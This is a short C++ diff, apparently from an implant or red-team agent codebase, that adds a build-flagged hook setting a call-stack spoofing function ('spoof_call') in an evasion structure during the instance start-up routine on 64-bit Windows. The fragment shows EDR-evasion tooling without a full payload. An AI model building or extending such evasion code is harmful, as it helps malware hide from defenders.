@@ -935,6 +935,10 @@ auto declfn instance::start(
         return;
     }
 
+#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
+    evasion.spoof.call_fn = reinterpret_cast<PVOID>( spoof_call );
+#endif
+
     // initialize crypto
     if ( !crypto_init( *this ) ) {
         DBG_PRINTF( "crypto init failed\n" );
